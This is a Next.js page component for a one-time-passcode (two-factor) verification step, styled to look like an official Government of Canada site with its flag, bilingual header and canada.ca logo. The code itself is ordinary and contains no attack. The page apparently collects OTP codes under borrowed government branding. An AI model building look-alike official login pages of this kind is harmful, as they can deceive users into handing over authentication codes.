"use client";

import { useRouter } from "next/navigation";
import { use, useActionState } from "react";
import { verifyOtpAction } from "@/actions/authActions";
import { fetchApplicationByIdAction } from "@/actions/applicationActions";
import { useEffect, useState } from "react";
import { sendOtpAction } from "@/actions/authActions";

export default function TwoFactorPage({
  params,
}: {
  params: Promise<{ id: string }>;
}) {
  const { id } = use(params);
  const router = useRouter();

  const [applicationData, setApplicationData] = useState<any>(null);
  const [isResending, setIsResending] = useState(false);


  // ✅ Correct usage: initial state should match the action's expected state type
  const [state, formAction] = useActionState(verifyOtpAction, {});

  const handleResend = async () => {
    try {
      setIsResending(true);
      const res = await sendOtpAction(id); // send OTP for current user
      if (res.error) {
        alert(res.error.message?.[0] ?? "Failed to resend OTP");
        return;
      }
      alert("OTP has been resent to your email!");
    } catch (err) {
      console.error(err);
      alert("Something went wrong while resending OTP.");
    } finally {
      setIsResending(false);
    }
  };

  // Fetch application data dynamically
  useEffect(() => {
    async function fetchData() {
      const res = await fetchApplicationByIdAction(id);
      if (res.data) setApplicationData(res.data);
    }
    fetchData();
  }, [id]);

  // Redirect if OTP verified
  useEffect(() => {
    if (state?.data?.application) {
      router.push(`/auth-success/${id}`);
    }
  }, [state?.data, id, router]);

  // Mask email for privacy
  const maskedEmail = applicationData?.email
    ? `${applicationData.email[0]}*****${applicationData.email
      .split("@")[0]
      .slice(-1)}@${applicationData.email.split("@")[1]}`
    : "Loading...";


  return (
    <main className="min-h-screen bg-white text-gray-900">
      {/* Header */}
      <header className="bg-white border-b w-full">
        <div className="w-full flex items-center justify-between px-8 py-5 max-w-none">
          <div className="flex items-center space-x-6">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Flag_of_Canada_%28Pantone%29.svg"
              alt="Canadian Flag"
              className="w-20 h-20"
            />
            <div className="leading-tight">
              <p className="text-lg font-bold">Government</p>
              <p className="text-lg font-bold">of Canada</p>
            </div>
            <div className="ml-6 border-l h-8 border-gray-300"></div>
            <div className="leading-tight">
              <p className="text-lg font-bold">Gouvernement</p>
              <p className="text-lg font-bold">du Canada</p>
            </div>
          </div>
          <a
            href="#"
            className="text-base text-blue-900 hover:underline font-medium"
          >
            Français
          </a>
        </div>

        <div className="bg-gray-800 text-white text-lg font-semibold px-6 py-3">
          Two-Factor Authentication
        </div>

        <nav className="w-full bg-[#E1E4E7] text-sm border-t border-b border-white/20">
          <div className="flex justify-start gap-8 px-6">
            <a
              href="#"
              className="py-3 hover:underline text-[16px] text-[#2f4b72]"
            >
              Contact Us
            </a>
            <a
              href="#"
              className="py-3 hover:underline text-[16px] text-[#2f4b72]"
            >
              FAQ
            </a>
            <a
              href="#"
              className="py-3 hover:underline text-[16px] text-[#2f4b72]"
            >
              Help
            </a>
          </div>
        </nav>
      </header>

      {/* Content */}
      <div className="max-w-4xl mx-auto px-6 py-10">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 border-b border-[#990000] w-fit pb-1 mb-3">
            Two-Factor Authentication
          </h1>
          <p className="text-[15px] text-gray-800">
            Enter the one-time passcode (OTP) sent to your registered email to
            continue.
          </p>
        </div>

        {/* Info */}
        <div className="space-y-2 mb-6 text-[15px]">
          <p>
            An email with a one-time passcode has been sent to{" "}
            <span className="break-words font-medium">{maskedEmail}</span>.
          </p>
          <p>
            The code will expire after <span className="font-medium">10</span>{" "}
            minutes. The OTP is case sensitive.
          </p>

          <details className="bg-gray-50 border rounded-md p-3">
            <summary className="cursor-pointer font-medium text-blue-800">
              How do I obtain this code?
            </summary>
            <ol className="list-decimal ml-6 mt-2 space-y-1 text-gray-700 text-[14px]">
              <li>An email with a one-time passcode has been sent to your email.</li>
              <li>Copy or enter the OTP from your email into the field below.</li>
              <li>Press enter or select Continue.</li>
            </ol>
          </details>
        </div>

        {/* OTP Form */}
        <form className="space-y-6" action={formAction}>
          {/* Include ID as hidden input */}
          <input type="hidden" name="id" value={id} />

          <div>
            <label
              htmlFor="otp"
              className="block font-semibold mb-1 text-gray-900"
            >
              <span className="text-red-600">*</span> One-time passcode{" "}
              <span className="text-red-600 text-sm">(Required field)</span>
            </label>
            <input
              id="otp"
              name="otp"
              type="text"
              required
              className="w-full border border-gray-400 rounded px-3 py-1"
            />
          </div>

          {state?.error && (
            <p className="text-red-600 text-sm">
              {typeof state.error.message === "string"
                ? state.error.message
                : (state.error.message || []).join(", ")}
            </p>
          )}

          <div className="flex gap-4">
            <button
              type="submit"
              className="bg-[#BC3331] text-white px-6 py-2 rounded hover:bg-[#A82C2A]"
            >
              Continue
            </button>
            <a
              href="/signin"
              className="px-6 py-2 rounded border border-gray-400 text-gray-900 hover:bg-gray-100"
            >
              Cancel
            </a>
          </div>
        </form>

        {/* Resend */}
        <div className="mt-8 text-[15px]">
          <h2 className="text-base font-semibold mb-2">
            Did not receive your OTP or it has expired?
          </h2>
          <p className="mb-2">
            Please wait at least 2 minutes and check your spam folder.
          </p>
          <button
            type="button"
            onClick={handleResend}
            disabled={isResending}
            className="border border-gray-400 px-6 py-2 rounded hover:bg-gray-100 disabled:opacity-50"
          >
            {isResending ? "Resending..." : "Resend code"}
          </button>

        </div>

        {/* Recovery */}
        <div className="mt-8 text-[15px]">
          <p>
            Can’t complete email authentication? You can log in with a
            recovery code.
          </p>
          <a
            href="/recovery"
            className="mt-3 inline-block border border-gray-400 px-6 py-2 rounded hover:bg-gray-100"
          >
            Recover account
          </a>
        </div>

        <div className="mt-12 text-sm text-gray-600">
          Date modified:{" "}
          <strong>
            {applicationData?.updatedAt
              ? new Date(applicationData.updatedAt).toLocaleDateString()
              : "Loading..."}
          </strong>
        </div>
      </div>

      <footer className="w-full border-t bg-[#E1E4E7] text-sm">
        <div className="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
          <nav className="flex gap-6">
            <a href="#" className="hover:underline text-[#2f4b72]">
              Terms and conditions
            </a>
            <a href="#" className="hover:underline text-[#2f4b72]">
              Privacy
            </a>
          </nav>
          <img
            src="https://www.canada.ca/etc/designs/canada/cdts/gcweb/v4_0_43/wet-boew/assets/wmms-blk.svg"
            alt="Canada logo"
            className="h-8"
          />
        </div>
      </footer>
    </main>
  );
}
